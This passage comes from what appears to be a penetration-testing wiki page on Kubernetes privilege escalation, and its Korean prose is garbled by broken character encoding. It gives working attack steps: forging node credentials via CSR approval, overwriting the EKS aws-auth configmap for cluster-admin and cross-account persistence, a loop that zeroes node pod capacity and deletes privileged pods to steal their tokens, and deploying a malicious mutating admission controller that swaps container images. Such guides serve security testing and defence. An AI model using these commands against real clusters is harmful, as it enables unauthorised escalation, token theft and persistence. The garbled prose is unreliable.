[ë¬¸ì„œì— ë”°ë¥´ë©´ ì´ ìš”ì²­ì„ ìë™ìœ¼ë¡œ ìŠ¹ì¸í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), ë”°ë¼ì„œ ì´ ê²½ìš° **ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê·¸ë ‡ì§€ ì•Šë‹¤ë©´ ìš”ì²­ì„ ìŠ¹ì¸í•  ìˆ˜ ìˆì–´ì•¼ í•˜ë©°, ì´ëŠ” `certificatesigningrequests/approval`ì—ì„œ ì—…ë°ì´íŠ¸í•˜ê³  `signers`ì—ì„œ `<signerNameDomain>/<signerNamePath>` ë˜ëŠ” `<signerNameDomain>/*`ì˜ resourceNameìœ¼ë¡œ `approve`ë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤.

í•„ìš”í•œ ëª¨ë“  ê¶Œí•œì„ ê°€ì§„ **ì—­í• ì˜ ì˜ˆ**ëŠ”:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
ê·¸ë˜ì„œ, ìƒˆë¡œìš´ ë…¸ë“œ CSRì´ ìŠ¹ì¸ë˜ë©´, ë…¸ë“œì˜ íŠ¹ë³„í•œ ê¶Œí•œì„ **ì•…ìš©**í•˜ì—¬ **ë¹„ë°€ì„ í›”ì¹˜ê³ ** **ê¶Œí•œì„ ìƒìŠ¹**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì´ ê²Œì‹œë¬¼**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)ê³¼ [**ì´ ê²Œì‹œë¬¼**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ì—ì„œ GKE K8s TLS ë¶€íŠ¸ìŠ¤íŠ¸ë© êµ¬ì„±ì€ **ìë™ ì„œëª…**ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©°, ì´ë¥¼ ì•…ìš©í•˜ì—¬ ìƒˆë¡œìš´ K8s ë…¸ë“œì˜ ìê²© ì¦ëª…ì„ ìƒì„±í•œ ë‹¤ìŒ, ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¹„ë°€ì„ í›”ì³ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.\
**ì–¸ê¸‰ëœ ê¶Œí•œì´ ìˆë‹¤ë©´ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ì²« ë²ˆì§¸ ì˜ˆì œëŠ” ìƒˆë¡œìš´ ë…¸ë“œê°€ ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì˜ ë¹„ë°€ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ëŠ” ì˜¤ë¥˜ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ **ë…¸ë“œëŠ” ìì‹ ì—ê²Œ ë§ˆìš´íŠ¸ëœ ì»¨í…Œì´ë„ˆì˜ ë¹„ë°€ë§Œ ì ‘ê·¼í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.**

ì´ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ **í¥ë¯¸ë¡œìš´ ë¹„ë°€ì´ ë§ˆìš´íŠ¸ëœ ì»¨í…Œì´ë„ˆì˜ ë…¸ë“œ ì´ë¦„ì— ëŒ€í•œ ë…¸ë“œ ìê²© ì¦ëª…ì„ ìƒì„±í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤ (í•˜ì§€ë§Œ ì²« ë²ˆì§¸ ê²Œì‹œë¬¼ì—ì„œ ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS í´ëŸ¬ìŠ¤í„°ì˜ kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ **`configmaps`**ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” **aws-auth** configmapì„ ë®ì–´ì”€ìœ¼ë¡œì¨ í´ëŸ¬ìŠ¤í„° ê´€ë¦¬ì ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•„ìš”í•œ ë™ì‚¬ëŠ” **`update`**ì™€ **`patch`**, ë˜ëŠ” configmapì´ ìƒì„±ë˜ì§€ ì•Šì€ ê²½ìš° **`create`**ì…ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**`aws-auth`**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë‹¤ë¥¸ ê³„ì •**ì˜ ì‚¬ìš©ìì—ê²Œ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ **ì§€ì†ì„±**ì„ ìœ ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ `aws --profile other_account eks update-kubeconfig --name <cluster-name>`ëŠ” **ë‹¤ë¥¸ ê³„ì •**ì—ì„œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì‹¤ì œë¡œ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`ëŠ” í´ëŸ¬ìŠ¤í„°ì˜ ARNì„ ì´ë¦„ ëŒ€ì‹  ë„£ìœ¼ë©´ ì‘ë™í•©ë‹ˆë‹¤.\
`kubectl`ì´ ì‘ë™í•˜ë„ë¡ í•˜ë ¤ë©´ **í¬ìƒìì˜ kubeconfig**ë¥¼ **êµ¬ì„±**í•˜ê³  aws exec argsì— `--profile other_account_role`ì„ ì¶”ê°€í•˜ì—¬ kubectlì´ ë‹¤ë¥¸ ê³„ì • í”„ë¡œí•„ì„ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ê°€ì ¸ì˜¤ê³  AWSì— ì—°ë½í•˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### GKEì—ì„œì˜ ê¶Œí•œ ìƒìŠ¹

GCP ì£¼ì²´ì— K8s ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” **2ê°€ì§€ ë°©ë²•**ì´ ìˆìŠµë‹ˆë‹¤. ì–´ë–¤ ê²½ìš°ë“  ì£¼ì²´ëŠ” í´ëŸ¬ìŠ¤í„°ì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ ìê²© ì¦ëª…ì„ ìˆ˜ì§‘í•  ìˆ˜ ìˆë„ë¡ **`container.clusters.get`** ê¶Œí•œì´ í•„ìš”í•˜ë©°, ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ **ìì‹ ì˜ kubectl êµ¬ì„± íŒŒì¼ì„ ìƒì„±í•´ì•¼** í•©ë‹ˆë‹¤ (ë‹¤ìŒ ë§í¬ë¥¼ ë”°ë¥´ì„¸ìš”).

{% hint style="warning" %}
K8s API ì—”ë“œí¬ì¸íŠ¸ì™€ í†µì‹ í•  ë•Œ, **GCP ì¸ì¦ í† í°ì´ ì „ì†¡ë©ë‹ˆë‹¤**. ê·¸ëŸ° ë‹¤ìŒ GCPëŠ” K8s API ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ **ì£¼ì²´**(ì´ë©”ì¼ë¡œ)ê°€ í´ëŸ¬ìŠ¤í„° ë‚´ì— **ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ”ì§€** ë¨¼ì € **í™•ì¸**í•˜ê³ , ê·¸ ë‹¤ìŒ **GCP IAMì„ í†µí•´ ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ”ì§€** í™•ì¸í•©ë‹ˆë‹¤.\
ì´ ì¤‘ **í•˜ë‚˜ë¼ë„** **ì°¸**ì´ë©´ ì‘ë‹µì„ ë°›ê²Œ ë©ë‹ˆë‹¤. **ì•„ë‹ˆë©´** **GCP IAMì„ í†µí•´ ê¶Œí•œì„ ë¶€ì—¬í•˜ë¼ëŠ”** ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.
{% endhint %}

ì²« ë²ˆì§¸ ë°©ë²•ì€ **GCP IAM**ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ë©°, K8s ê¶Œí•œì€ **ìƒì‘í•˜ëŠ” GCP IAM ê¶Œí•œ**ì´ ìˆìœ¼ë©°, ì£¼ì²´ê°€ ì´ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

ë‘ ë²ˆì§¸ ë°©ë²•ì€ **í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ K8s ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”** ê²ƒìœ¼ë¡œ, ì‚¬ìš©ìë¥¼ **ì´ë©”ì¼**ë¡œ ì‹ë³„í•©ë‹ˆë‹¤ (GCP ì„œë¹„ìŠ¤ ê³„ì • í¬í•¨).

### ì„œë¹„ìŠ¤ ê³„ì • í† í° ìƒì„±

**TokenRequests** (`serviceaccounts/token`)ë¥¼ **ìƒì„±í•  ìˆ˜ ìˆëŠ” ì£¼ì²´**ëŠ” K8s API ì—”ë“œí¬ì¸íŠ¸ì™€ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì •ë³´ëŠ” [**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)ì—ì„œ í™•ì¸).

### ephemeralcontainers

**`update`** ë˜ëŠ” **`patch`** **`pods/ephemeralcontainers`**ë¥¼ í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” **ë‹¤ë¥¸ podsì—ì„œ ì½”ë“œ ì‹¤í–‰**ì„ ì–»ì„ ìˆ˜ ìˆìœ¼ë©°, íŠ¹ê¶Œì´ ìˆëŠ” securityContextë¡œ ephemeral containerë¥¼ ì¶”ê°€í•˜ì—¬ **ë…¸ë“œì—ì„œ íƒˆì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ValidatingWebhookConfigurations ë˜ëŠ” MutatingWebhookConfigurations

`validatingwebhookconfigurations` ë˜ëŠ” `mutatingwebhookconfigurations`ì— ëŒ€í•´ `create`, `update` ë˜ëŠ” `patch` ë™ì‚¬ë¥¼ ê°€ì§„ ì£¼ì²´ëŠ” **ê¶Œí•œ ìƒìŠ¹**ì„ ìœ„í•´ **ì´ëŸ¬í•œ webhookconfigurations ì¤‘ í•˜ë‚˜ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[`mutatingwebhookconfigurations` ì˜ˆì œëŠ” ì´ ê²Œì‹œë¬¼ì˜ ì´ ì„¹ì…˜ì„ í™•ì¸í•˜ì„¸ìš”](./#malicious-admission-controller).

### ê¶Œí•œ ìƒìŠ¹

ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì½ì„ ìˆ˜ ìˆë“¯ì´: [**ë‚´ì¥ëœ ê¶Œí•œ ìƒìŠ¹ ë°©ì§€**](./#built-in-privileged-escalation-prevention), ì£¼ì²´ëŠ” ìì‹ ì´ ìƒˆë¡œìš´ ê¶Œí•œì„ ê°€ì§€ì§€ ì•Šê³ ëŠ” ì—­í• ì´ë‚˜ í´ëŸ¬ìŠ¤í„° ì—­í• ì„ ì—…ë°ì´íŠ¸í•˜ê±°ë‚˜ ìƒì„±í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë‹¨, **`roles`** ë˜ëŠ” **`clusterroles`**ì— ëŒ€í•´ **`escalate`** ë™ì‚¬ë¥¼ ê°€ì§„ ê²½ìš°ëŠ” ì˜ˆì™¸ì…ë‹ˆë‹¤.\
ê·¸ë ‡ë‹¤ë©´ ê·¸ëŠ” ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ ìƒˆë¡œìš´ ì—­í• , í´ëŸ¬ìŠ¤í„° ì—­í• ì„ ì—…ë°ì´íŠ¸/ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë…¸ë“œ í”„ë¡ì‹œ

**`nodes/proxy`** í•˜ìœ„ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” Kubelet APIë¥¼ í†µí•´ **podsì—ì„œ ì½”ë“œ ì‹¤í–‰**ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì •ë³´ëŠ” [**ì´ê³³**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)ì—ì„œ í™•ì¸). Kubelet ì¸ì¦ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” ì´ í˜ì´ì§€ì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**Kubelet APIì— ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ RCEë¥¼ ì–»ëŠ” ë°©ë²•ì— ëŒ€í•œ ì˜ˆì œëŠ” ì—¬ê¸°**](../pentesting-kubernetes-services/#kubelet-rce)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### pods ì‚­ì œ + ìŠ¤ì¼€ì¤„ ë¶ˆê°€ëŠ¥í•œ ë…¸ë“œ

**podsë¥¼ ì‚­ì œ**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´(`pods` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `delete` ë™ì‚¬), ë˜ëŠ” **podsë¥¼ í‡´ê±°**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´(`pods/eviction` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `create` ë™ì‚¬), ë˜ëŠ” **pod ìƒíƒœë¥¼ ë³€ê²½**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´(`pods/status`ì— ëŒ€í•œ ì ‘ê·¼)ì™€ **ë‹¤ë¥¸ ë…¸ë“œë¥¼ ìŠ¤ì¼€ì¤„ ë¶ˆê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆëŠ”** ì£¼ì²´(`nodes/status`ì— ëŒ€í•œ ì ‘ê·¼) ë˜ëŠ” **ë…¸ë“œë¥¼ ì‚­ì œ**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´(`nodes` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `delete` ë™ì‚¬)ì™€ podì— ëŒ€í•œ ì œì–´ê¶Œì„ ê°€ì§„ ì£¼ì²´ëŠ” **ë‹¤ë¥¸ ë…¸ë“œì—ì„œ podsë¥¼ í›”ì³** **ì†ìƒëœ** **ë…¸ë“œ**ì—ì„œ **ì‹¤í–‰**ë˜ë„ë¡ í•  ìˆ˜ ìˆìœ¼ë©°, ê³µê²©ìëŠ” ì´ëŸ¬í•œ podsì—ì„œ **í† í°ì„ í›”ì¹ ** ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ì„œë¹„ìŠ¤ ìƒíƒœ (CVE-2020-8554)

**`services/status`**ë¥¼ **ìˆ˜ì •**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” `status.loadBalancer.ingress.ip` í•„ë“œë¥¼ ì„¤ì •í•˜ì—¬ **ìˆ˜ì •ë˜ì§€ ì•Šì€ CVE-2020-8554**ë¥¼ ì•…ìš©í•˜ê³  **í´ëŸ¬ìŠ¤í„°ì— ëŒ€í•œ MiTM ê³µê²©**ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. CVE-2020-8554ì— ëŒ€í•œ ëŒ€ë¶€ë¶„ì˜ ì™„í™” ì¡°ì¹˜ëŠ” ExternalIP ì„œë¹„ìŠ¤ë§Œ ë°©ì§€í•©ë‹ˆë‹¤ (ìì„¸í•œ ë‚´ìš©ì€ [**ì´ê³³**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego) ì°¸ì¡°).

### ë…¸ë“œ ë° íŒŒë“œ ìƒíƒœ

`nodes/status` ë˜ëŠ” `pods/status`ì— ëŒ€í•œ **`update`** ë˜ëŠ” **`patch`** ê¶Œí•œì´ ìˆëŠ” ì£¼ì²´ëŠ” ë ˆì´ë¸”ì„ ìˆ˜ì •í•˜ì—¬ ì ìš©ë˜ëŠ” ìŠ¤ì¼€ì¤„ë§ ì œì•½ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë‚´ì¥ëœ ê¶Œí•œ ìƒìŠ¹ ë°©ì§€

KubernetesëŠ” ê¶Œí•œ ìƒìŠ¹ì„ ë°©ì§€í•˜ê¸° ìœ„í•œ [ë‚´ì¥ ë©”ì»¤ë‹ˆì¦˜](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.

ì´ ì‹œìŠ¤í…œì€ **ì‚¬ìš©ìê°€ ì—­í• ì´ë‚˜ ì—­í•  ë°”ì¸ë”©ì„ ìˆ˜ì •í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ì—†ë„ë¡ ë³´ì¥**í•©ë‹ˆë‹¤. ì´ ê·œì¹™ì˜ ì‹œí–‰ì€ API ìˆ˜ì¤€ì—ì„œ ì´ë£¨ì–´ì§€ë©°, RBAC ì¸ì¦ìê°€ ë¹„í™œì„±í™”ëœ ê²½ìš°ì—ë„ ì•ˆì „ ì¥ì¹˜ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ê·œì¹™ì€ **ì‚¬ìš©ìê°€ ì—­í• ì„ ìƒì„±í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆëŠ” ê²ƒì€ ê·¸ ì—­í• ì´ í¬í•¨í•˜ëŠ” ëª¨ë“  ê¶Œí•œì„ ë³´ìœ í•˜ê³  ìˆì„ ë•Œë§Œ ê°€ëŠ¥**í•˜ë‹¤ê³  ëª…ì‹œí•©ë‹ˆë‹¤. ë˜í•œ ì‚¬ìš©ìì˜ ê¸°ì¡´ ê¶Œí•œ ë²”ìœ„ëŠ” ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•˜ë ¤ëŠ” ì—­í• ì˜ ë²”ìœ„ì™€ ì¼ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤: ClusterRolesì˜ ê²½ìš° í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ëŒ€í•´, Rolesì˜ ê²½ìš° ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤(ë˜ëŠ” í´ëŸ¬ìŠ¤í„° ì „ì²´)ì— ì œí•œë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì´ì „ ê·œì¹™ì—ëŠ” ì˜ˆì™¸ê°€ ìˆìŠµë‹ˆë‹¤. ì£¼ì²´ê°€ **`roles`** ë˜ëŠ” **`clusterroles`**ì— ëŒ€í•´ **`escalate`** ë™ì‚¬ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´, ê¶Œí•œì´ ì—†ë”ë¼ë„ ì—­í• ê³¼ í´ëŸ¬ìŠ¤í„° ì—­í• ì˜ ê¶Œí•œì„ ì¦ê°€ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### **RoleBindings/ClusterRoleBindings ê°€ì ¸ì˜¤ê¸° ë° íŒ¨ì¹˜í•˜ê¸°**

{% hint style="danger" %}
**ì´ ê¸°ìˆ ì€ ì´ì „ì— ì‘ë™í–ˆì§€ë§Œ, ë‚´ í…ŒìŠ¤íŠ¸ì— ë”°ë¥´ë©´ ì´ì „ ì„¹ì…˜ì—ì„œ ì„¤ëª…í•œ ë™ì¼í•œ ì´ìœ ë¡œ ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ë¯¸ ê¶Œí•œì´ ì—†ëŠ” ê²½ìš° ìì‹ ì´ë‚˜ ë‹¤ë¥¸ SAì—ê²Œ ê¶Œí•œì„ ë¶€ì—¬í•˜ê¸° ìœ„í•´ rolebindingì„ ìƒì„±/ìˆ˜ì •í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.**
{% endhint %}

Rolebindingsë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì€ ì‚¬ìš©ìê°€ **ì—­í• ì„ ì„œë¹„ìŠ¤ ê³„ì •ì— ë°”ì¸ë”©**í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ê¶Œí•œì€ **ì‚¬ìš©ìê°€ ì†ìƒëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ê´€ë¦¬ì ê¶Œí•œì„ ë°”ì¸ë”©í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

## ê¸°íƒ€ ê³µê²©

### ì‚¬ì´ë“œì¹´ í”„ë¡ì‹œ ì•±

ê¸°ë³¸ì ìœ¼ë¡œ íŒŒë“œ ê°„ì˜ í†µì‹ ì—ëŠ” ì•”í˜¸í™”ê°€ ì—†ìŠµë‹ˆë‹¤. ìƒí˜¸ ì¸ì¦, ì–‘ë°©í–¥, íŒŒë“œ ê°„.

#### ì‚¬ì´ë“œì¹´ í”„ë¡ì‹œ ì•± ë§Œë“¤ê¸° <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yam íŒŒì¼ì„ ë§Œë“œì„¸ìš”.
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
.yam íŒŒì¼ì„ í¸ì§‘í•˜ê³  ì£¼ì„ì´ ì—†ëŠ” ì¤„ì„ ì¶”ê°€í•˜ì„¸ìš”:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
í”„ë¡ì‹œì˜ ë¡œê·¸ë¥¼ í™•ì¸í•˜ì„¸ìš”:
```bash
kubectl logs app -C proxy
```
ë” ë§ì€ ì •ë³´ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ì•…ì˜ì ì¸ Admission Controller

Admission controllerëŠ” **ê°ì²´ì˜ ì§€ì†í™” ì´ì „ì— Kubernetes API ì„œë²„ì— ëŒ€í•œ ìš”ì²­ì„ ê°€ë¡œì±•ë‹ˆë‹¤**, í•˜ì§€ë§Œ **ìš”ì²­ì´ ì¸ì¦ë˜ê³ ** **ì¸ê°€ëœ í›„ì—** ê°€ë¡œì±•ë‹ˆë‹¤.

ê³µê²©ìê°€ ì–´ë–»ê²Œë“  **Mutationg Admission Controllerë¥¼ ì£¼ì…**í•˜ëŠ” ë° ì„±ê³µí•œë‹¤ë©´, ê·¸ëŠ” **ì´ë¯¸ ì¸ì¦ëœ ìš”ì²­ì„ ìˆ˜ì •**í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ì ì¬ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìœ¼ë©°, ë” ì¼ë°˜ì ìœ¼ë¡œ í´ëŸ¬ìŠ¤í„°ì— ì§€ì†ì ìœ¼ë¡œ ë‚¨ì•„ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì˜ˆì‹œ ì¶œì²˜** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ìƒíƒœë¥¼ í™•ì¸í•˜ì—¬ ì¤€ë¹„ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ê·¸ëŸ° ë‹¤ìŒ ìƒˆ í¬ë“œë¥¼ ë°°í¬í•©ë‹ˆë‹¤:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
`ErrImagePull` ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ ë‹¤ìŒ ì¿¼ë¦¬ ì¤‘ í•˜ë‚˜ë¡œ ì´ë¯¸ì§€ ì´ë¦„ì„ í™•ì¸í•˜ì„¸ìš”:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ìœ„ ì´ë¯¸ì§€ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, ìš°ë¦¬ëŠ” `nginx` ì´ë¯¸ì§€ë¥¼ ì‹¤í–‰í•˜ë ¤ê³  í–ˆì§€ë§Œ ìµœì¢… ì‹¤í–‰ëœ ì´ë¯¸ì§€ëŠ” `rewanthtammana/malicious-image`ì…ë‹ˆë‹¤. ë„ëŒ€ì²´ ë¬´ìŠ¨ ì¼ì´ ì¼ì–´ë‚œ ê±¸ê¹Œìš”!?

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` ìŠ¤í¬ë¦½íŠ¸ëŠ” ë³€í˜• ì›¹í›… ìŠ¹ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ ì„¤ì •í•˜ë©°, ì´ëŠ” êµ¬ì„± ë¼ì¸ì— ì§€ì •ëœ ëŒ€ë¡œ Kubernetes APIì— ëŒ€í•œ ìš”ì²­ì„ ìˆ˜ì •í•˜ì—¬ ê´€ì°°ëœ ê²°ê³¼ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper ìš°íšŒ

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

